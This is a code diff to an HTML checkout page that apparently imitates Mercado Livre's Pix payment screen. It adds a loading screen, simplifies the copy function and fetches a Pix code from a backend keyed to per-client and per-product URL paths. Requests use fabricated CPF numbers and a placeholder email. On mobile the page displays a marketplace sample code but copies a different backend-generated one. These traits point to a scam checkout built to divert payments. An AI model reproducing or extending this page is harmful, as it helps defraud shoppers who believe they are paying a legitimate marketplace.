@@ -44,6 +44,57 @@
             line-height: 1.4;
         }
 
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .loading-screen.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top-color: #3483fa;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #666;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        /* Esconde conteúdo principal até QR code estar pronto */
+        .main-content {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .main-content.ready {
+            opacity: 1;
+        }
+
         .header {
             background-color: #ffeb00;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
@@ -675,6 +726,13 @@
     </style>
 </head>
 <body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Gerando QR Code PIX...</div>
+    </div>
+
+    <div class="main-content" id="mainContent">
     <header class="header nav-header">
         <div class="nav-bounds">
             <div class="logo">
@@ -724,7 +782,7 @@
                     <p class="section-description">Escolha pagar via Pix pelo seu Internet Banking ou app de pagamentos. Depois,<br> cole o seguinte código:</p>
                     
                 <div class="code-input-wrapper" id="pixWrapper">
-                    <textarea class="code-input code-input--compact" id="pixCode" readonly inputmode="none" tabindex="-1" rows="3">00020126540014br.gov.bcb.pix0132pix_marketplace@mercadolibre.com52040000530398654075594.305802BR5911@29691096146009Sao Paulo62250521mpqrinter13198264136304325F</textarea>
+                    <textarea class="code-input code-input--compact" id="pixCode" readonly inputmode="none" rows="3">00020126540014br.gov.bcb.pix0132pix_marketplace@mercadolibre.com52040000530398654075594.305802BR5911@29691096146009Sao Paulo62250521mpqrinter13198264136304325F</textarea>
                 </div>
                     
                     <div class="instant-payment instant-payment--mobile">
@@ -744,21 +802,13 @@
             </div>
         </div>
     </div>
+    </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <script>
         let realPixCode = '';
         function copyPixCode(event) {
-            if (event) {
-                event.preventDefault();
-                event.stopPropagation();
-            }
-            
-            // Desfoca qualquer elemento ativo para evitar teclado no mobile
-            if (document.activeElement && typeof document.activeElement.blur === 'function') {
-                document.activeElement.blur();
-            }
-            
+            if (event) event.preventDefault();
             const pixCode = document.getElementById('pixCode');
             const textToCopy = realPixCode || (pixCode ? pixCode.value : '');
 
@@ -786,17 +836,9 @@
                 button.style.background = '#00a650';
                 button.style.transform = 'scale(0.95)';
                 button.style.transition = 'all 0.2s ease';
-                // Garantir que nada está focado
                 if (document.activeElement && typeof document.activeElement.blur === 'function') {
                     document.activeElement.blur();
                 }
-                // Focar o botão temporariamente e depois desfocar para evitar teclado
-                button.focus();
-                setTimeout(() => {
-                    if (document.activeElement === button) {
-                        button.blur();
-                    }
-                }, 100);
                 setTimeout(() => {
                     button.textContent = originalText;
                     button.style.background = originalBackground;
@@ -807,46 +849,30 @@
 
             if (navigator.clipboard && window.isSecureContext) {
                 navigator.clipboard.writeText(textToCopy).then(giveFeedback).catch(() => {
-                    // Fallback: criar textarea invisível sem foco
                     const helper = document.createElement('textarea');
                     helper.value = textToCopy;
                     helper.setAttribute('readonly', '');
-                    helper.setAttribute('inputmode', 'none');
-                    helper.setAttribute('tabindex', '-1');
                     helper.style.position = 'fixed';
                     helper.style.opacity = '0';
-                    helper.style.pointerEvents = 'none';
                     helper.style.left = '-9999px';
-                    helper.style.top = '-9999px';
-                    helper.style.width = '1px';
-                    helper.style.height = '1px';
                     document.body.appendChild(helper);
-                    // Usar setSelectionRange em vez de select() para evitar foco
-                    helper.setSelectionRange(0, textToCopy.length);
-                    try { 
-                        document.execCommand('copy'); 
-                    } catch (_) {}
+                    helper.select();
+                    try { document.execCommand('copy'); } catch (_) {}
                     document.body.removeChild(helper);
                     giveFeedback();
                 });
                 return;
             }
 
-            // Fallback clássico sem focar o textarea
+            // Fallback clássico sem focar o textarea visível
             const helper = document.createElement('textarea');
             helper.value = textToCopy;
             helper.setAttribute('readonly', '');
-            helper.setAttribute('inputmode', 'none');
-            helper.setAttribute('tabindex', '-1');
             helper.style.position = 'fixed';
             helper.style.opacity = '0';
-            helper.style.pointerEvents = 'none';
             helper.style.left = '-9999px';
-            helper.style.top = '-9999px';
-            helper.style.width = '1px';
-            helper.style.height = '1px';
             document.body.appendChild(helper);
-            helper.setSelectionRange(0, textToCopy.length);
+            helper.select();
             try { document.execCommand('copy'); } catch (_) {}
             document.body.removeChild(helper);
             giveFeedback();
@@ -871,34 +897,35 @@
         }
 
         document.addEventListener('DOMContentLoaded', function() {
-            const cards = document.querySelectorAll('.payment-card, .qr-section, .copy-section');
-            cards.forEach((card, index) => {
-                card.style.opacity = '0';
-                card.style.transform = 'translateY(20px)';
-                setTimeout(() => {
-                    card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
-                    card.style.opacity = '1';
-                    card.style.transform = 'translateY(0)';
-                }, index * 200);
-            });
-
+            const loadingScreen = document.getElementById('loadingScreen');
+            const mainContent = document.getElementById('mainContent');
             const pixInput = document.getElementById('pixCode');
-            // Prevenir foco no textarea para evitar teclado no mobile
-            if (pixInput) {
-                pixInput.addEventListener('focus', function(e) {
-                    e.preventDefault();
-                    this.blur();
-                });
-                pixInput.addEventListener('touchstart', function(e) {
-                    e.preventDefault();
-                    this.blur();
-                });
-                pixInput.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    this.blur();
-                });
-            }
             const qrContainer = document.getElementById('qrCode');
+
+            // Função para mostrar conteúdo quando QR code estiver pronto
+            const showContent = () => {
+                // Esconde loading
+                if (loadingScreen) {
+                    loadingScreen.classList.add('hidden');
+                }
+                // Mostra conteúdo principal
+                if (mainContent) {
+                    mainContent.classList.add('ready');
+                }
+                // Anima cards após um pequeno delay
+                setTimeout(() => {
+                    const cards = document.querySelectorAll('.payment-card, .qr-section, .copy-section');
+                    cards.forEach((card, index) => {
+                        card.style.opacity = '0';
+                        card.style.transform = 'translateY(20px)';
+                        setTimeout(() => {
+                            card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+                            card.style.opacity = '1';
+                            card.style.transform = 'translateY(0)';
+                        }, index * 100);
+                    });
+                }, 100);
+            };
 
             const generateQr = (text) => {
                 try {
@@ -931,16 +958,31 @@
                     const params = new URLSearchParams(window.location.search);
                     const apiPort = params.get('apiPort') || '4001';
                     let amountReais = 10.00; // padrão
-                    const hashMatch = (window.location.hash || '').match(/payment=([0-9]+(?:[\.,][0-9]+)?)/i);
-                    const pathMatch = (window.location.pathname || '').match(/payment=([0-9]+(?:[\.,][0-9]+)?)/i);
-                    const paymentFromHash = hashMatch ? hashMatch[1] : null;
-                    const paymentFromPath = pathMatch ? pathMatch[1] : null;
-                    const paymentFromQuery = params.get('payment');
-                    const pickedRaw = paymentFromHash ?? paymentFromPath ?? paymentFromQuery;
-                    if (pickedRaw) {
-                        const normalized = String(pickedRaw).replace(',', '.');
+                    
+                    // Extrai valor do pathname se for formato /cliente/produto/payment/valor
+                    const pathParts = window.location.pathname.split('/').filter(p => p);
+                    if (pathParts.length >= 4 && pathParts[2] === 'payment') {
+                        const valorFromPath = pathParts[3];
+                        const normalized = String(valorFromPath).replace(',', '.');
                         const n = Number(normalized);
-                        if (!Number.isNaN(n) && n > 0) amountReais = n;
+                        if (!Number.isNaN(n) && n > 0) {
+                            amountReais = n;
+                        }
+                    }
+                    
+                    // Tenta extrair de outras fontes se não encontrou no path
+                    if (amountReais === 10.00) {
+                        const hashMatch = (window.location.hash || '').match(/payment=([0-9]+(?:[\.,][0-9]+)?)/i);
+                        const pathMatch = (window.location.pathname || '').match(/payment=([0-9]+(?:[\.,][0-9]+)?)/i);
+                        const paymentFromHash = hashMatch ? hashMatch[1] : null;
+                        const paymentFromPath = pathMatch ? pathMatch[1] : null;
+                        const paymentFromQuery = params.get('payment');
+                        const pickedRaw = paymentFromHash ?? paymentFromPath ?? paymentFromQuery;
+                        if (pickedRaw) {
+                            const normalized = String(pickedRaw).replace(',', '.');
+                            const n = Number(normalized);
+                            if (!Number.isNaN(n) && n > 0) amountReais = n;
+                        }
                     }
 
                     const reais = Number(amountReais).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
@@ -948,23 +990,69 @@
                     if (headerEl) {
                         headerEl.innerHTML = `Pague ${reais} via Pix para concluir sua <span class="desktop-br"><br></span>compra`;
                     }
-                    // Usa caminho relativo para funcionar no servidor via Nginx
-                    const apiUrl = `${window.location.origin}/pix`;
+                    
+                    // Configura a URL da API do backend
+                    // Em desenvolvimento: usa porta 4001, em produção usa o mesmo origin
+                    const isDev = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+                    
+                    // Tenta usar rota simples /cliente/produto/payment/valor se houver cliente e produto no pathname
+                    let apiUrl;
+                    let useSimpleRoute = false;
+                    
+                    if (pathParts.length >= 4 && pathParts[2] === 'payment') {
+                        // Tem cliente, produto e payment no path: /cliente/produto/payment/valor
+                        const cliente = pathParts[0];
+                        const produto = pathParts[1];
+                        const valorFromPath = pathParts[3];
+                        // Usa o valor do path se disponível, senão usa o calculado
+                        const valorFinal = valorFromPath ? parseFloat(valorFromPath) : amountReais;
+                        const baseUrl = isDev ? 'http://localhost:4001' : window.location.origin;
+                        // Usa formato: /cliente/produto/payment/valor (com header Accept para API)
+                        apiUrl = `${baseUrl}/${cliente}/${produto}/payment/${valorFinal}`;
+                        useSimpleRoute = true;
+                    } else if (pathParts.length >= 2) {
+                        // Tem cliente e produto no path: /cliente/produto
+                        const cliente = pathParts[0];
+                        const produto = pathParts[1];
+                        const baseUrl = isDev ? 'http://localhost:4001' : window.location.origin;
+                        // Usa formato: /cliente/produto/payment/valor (com header Accept para API)
+                        apiUrl = `${baseUrl}/${cliente}/${produto}/payment/${amountReais}`;
+                        useSimpleRoute = true;
+                    } else {
+                        // Fallback para rota POST /pix (compatibilidade)
+                        apiUrl = isDev 
+                            ? `http://localhost:4001/pix` 
+                            : `${window.location.origin}/pix`;
+                    }
 
-                    const randomCode = `TESTE${Math.floor(Math.random()*1e6)}`;
-                    const payload = {
-                        code: randomCode,
-                        amount: amountReais,
-                        email: 'cliente2568@gmail.com',
-                        document: getRandomCpf(),
-                        url: 'https://checkout.seguromarketplace.com'
-                    };
-
-                    const resp = await fetch(apiUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
+                    let resp;
+                    if (useSimpleRoute) {
+                        // Usa GET na rota simples com Accept: application/json para indicar que é API
+                        resp = await fetch(apiUrl, {
+                            method: 'GET',
+                            headers: { 
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            }
+                        });
+                    } else {
+                        // Usa POST na rota /pix (fallback)
+                        const randomCode = `TESTE${Math.floor(Math.random()*1e6)}`;
+                        const payload = {
+                            code: randomCode,
+                            amount: amountReais,
+                            email: 'cliente2568@gmail.com',
+                            document: getRandomCpf(),
+                            url: isDev 
+                                ? `http://localhost:4001/webhook/umbrellapag` 
+                                : `${window.location.origin}/webhook/umbrellapag`
+                        };
+                        resp = await fetch(apiUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                    }
 
                     if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
                     const data = await resp.json();
@@ -973,9 +1061,26 @@
                     if (pixText) {
                         realPixCode = pixText;
                         generateQr(pixText);
+                        // Atualiza o campo de texto do PIX apenas no desktop
+                        // No mobile, mantém o código de exemplo
+                        if (pixInput && window.innerWidth >= 769) {
+                            pixInput.value = pixText;
+                        }
+                        // No mobile, mantém o código de exemplo mas salva o real para copiar
+                        // Mostra o conteúdo agora que o QR code está pronto
+                        showContent();
                         return;
+                    } else {
+                        // Se não tiver QR code, mostra mesmo assim (com QR de exemplo)
+                        generateQr();
+                        showContent();
                     }
                 } catch (e) {
+                    console.error('Erro ao gerar QR Code:', e);
+                    // Mesmo em caso de erro, mostra o conteúdo com QR de exemplo
+                    generateQr();
+                    showContent();
+                    
                     const box = document.createElement('div');
                     box.style.background = '#fff3cd';
                     box.style.border = '1px solid #ffeeba';
@@ -987,8 +1092,6 @@
                     const container = document.querySelector('.qr-section');
                     if (container) container.insertBefore(box, container.firstChild);
                 }
-
-                generateQr();
             })();
         });
     </script>
